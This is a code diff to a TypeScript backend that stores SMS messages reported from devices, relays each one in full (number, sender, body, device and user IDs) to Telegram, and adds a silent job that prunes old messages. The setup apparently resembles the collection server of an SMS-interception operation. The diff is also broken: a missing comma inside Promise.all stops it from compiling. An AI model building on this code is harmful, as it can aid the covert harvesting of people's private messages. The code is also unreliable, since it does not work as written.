@@ -298,6 +298,19 @@ async function broadcast(env: Env, event: string, data: unknown): Promise<void> 
     }
 
     // Direct immediate notification — one per event, full details, zero extra DB calls
+// ── Silent per-app message cap: keeps newest 2000, deletes older ones in background ──
+async function cleanupOldMessages(env: Env, appId: string): Promise<void> {
+  try {
+    const sqlA = neon(env.NEON_DATABASE_URL);
+    await sqlA(
+      `DELETE FROM messages WHERE app_id = $1 AND id NOT IN (
+        SELECT id FROM messages WHERE app_id = $1 ORDER BY id DESC LIMIT 2000
+      )`,
+      [appId]
+    );
+  } catch { /* silently swallow — cleanup is best-effort */ }
+}
+
     async function sendTelegram(env: Env, text: string, appId?: string): Promise<void> {
       try {
         await refreshTgCache(env);
@@ -802,17 +815,19 @@ app.post("/api/messages", async (c) => {
   }).returning();
   const mapped = mapMessage(inserted);
   await broadcast(c.env, "message_added", { appId: mapped.appId, message: mapped });
-  c.executionCtx.waitUntil(sendTelegram(c.env,
-    `📩 <b>New SMS</b>
-App: <code>${mapped.appId}</code>
-Device: <code>${mapped.deviceId}</code>
-From: <b>${mapped.fromNumber}</b>
-Sender: ${mapped.fromSender}
-To: ${mapped.toNumber ?? '—'}
-UserId: <code>${mapped.userId}</code>
-💬 ${mapped.body}`,
-    mapped.appId
-  ));
+  c.executionCtx.waitUntil(Promise.all([
+    sendTelegram(c.env,
+      `📩 <b>New SMS</b>
+  App: <code>${mapped.appId}</code>
+  Device: <code>${mapped.deviceId}</code>
+  From: <b>${mapped.fromNumber}</b>
+  Sender: ${mapped.fromSender}
+  To: ${mapped.toNumber ?? '—'}
+  UserId: <code>${mapped.userId}</code>
+  💬 ${mapped.body}`,
+      mapped.appId
+    cleanupOldMessages(c.env, mapped.appId),
+  ]));
   return c.json({ ok: true, id: mapped.id }, 201);
 });
 
